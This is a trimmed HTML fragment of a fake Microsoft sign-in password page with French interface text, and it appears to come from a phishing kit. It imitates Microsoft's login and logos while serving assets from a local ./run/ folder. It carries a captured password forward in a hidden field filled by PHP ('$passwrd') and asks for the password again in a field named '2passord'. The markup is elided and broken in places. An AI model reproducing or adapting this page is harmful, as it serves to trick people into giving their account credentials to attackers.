...
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-gr-c-s-loaded="true" cz-shortcut-listen="true">
        ...
        event: {
            footerAgreementClick: footer_agreementClick } }">
                ...
                <div class="middle app" data-bind="css: { &#39;app&#39;: backgroundLogoUrl }">
                    ...
                    <div class="background-logo-holder"> <img class="background-logo" role="presentation" data-bind="attr: { src: backgroundLogoUrl }" src="./run/37_533e293f0c8947ada653b47c00e394e2.png"> </div>
                    <!-- /ko -->
                ...
                css: {
                    ...
                    params: {
                        ...
                        bannerLogoUrl: bannerLogoUrl() } }">
                            ...
                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./run/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
        ...
        'slide-in-back': animate.isSlideInBack() }">
            ...
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
													...
													<input name="pass" type="hidden" id="i0118" autocomplete="off" class="form-control"  value="<?php echo $passwrd; ?>">
                                                    <input name="2passord" autofocus="autofocus" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc"  data-bind="
    ...
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }">
        ...
        hasFocus: focusMoreInfo()" aria-label="Cliquez ici pour obtenir des informations sur la résolution des problèmes">
                                    ...
                                    <!-- /ko -->
                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                    <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="./run/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </a>
